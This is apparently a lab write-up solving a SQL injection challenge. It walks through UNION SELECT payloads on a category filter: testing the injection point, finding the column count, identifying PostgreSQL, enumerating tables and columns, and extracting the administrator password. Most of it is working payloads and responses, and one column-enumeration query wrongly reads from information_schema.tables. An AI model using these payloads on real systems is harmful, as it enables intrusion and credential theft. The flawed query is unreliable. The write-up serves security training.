# SQL injection, listing the database contents on non-Oracle databases

### Goal:
`Log in to the application as the administrator user`
### Info: The injection point is the product category filter
`target.com/filter?category=<input>`
### Info: The target is using a non-Oracle database
### Note: Table names, column names, and the password contain randomized characters. If the lab for any reason, these names will be regenerated.
<br><br>

**<ins>Step 1: Test injection point</ins>**

category='

`500: server error`<br><br>

category='--

`200`
<br><br>

**<ins>Step 2: Enumerate data output with UNION attack</ins>**

We know that the database is either MySQL or Microsoft, which share similar syntax. We need to use this syntax for a successful attack.<br><br>

category='UNION SELECT NULL--

`500 server error`<br><br>

category='UNION SELECT NULL,NULL--

`200`

This means that the query outputs two values.
<br><br>

category='UNION SELECT 'a','b'--

`200`

This means that both values are strings. Knowing this, we can use either to output the desired data.
<br><br>

**<ins>Step 3: Enumerate database with UNION attack</ins>**

category='UNION SELECT @@version,NULL--

`500 server error`

This means that the database is not using Microsoft or MySQL.<br><br>

category='UNION SELECT version(),NULL--

`Postgre SQL 12.16`

Now we know what syntax to use to exfiltrate data.<br><br>

 **<ins>Step 4: Enumerate database structure with UNION attack</ins>**

 category='UNION SELECT table_name,NULL from information_schema.tables--

 `users_xxxxxx`

This table likely contains the information we're looking for, so we'll look at its columns.<br><br>

category=' UNION SELECT column_name,NULL from information_schema.tables WHERE table_name='users_xxxxxx'--

`username_xxxxxx, password_xxxxxx`<br><br>

**<ins>Step 5: Exfiltrate the data</ins>**

category='UNION SELECT password_xxxxxx,NULL FROM users_xxxxxx WHERE username_xxxxxx='administrator'--

`<password>`

Using this password with the username administrator will successfully log us in as the admin.
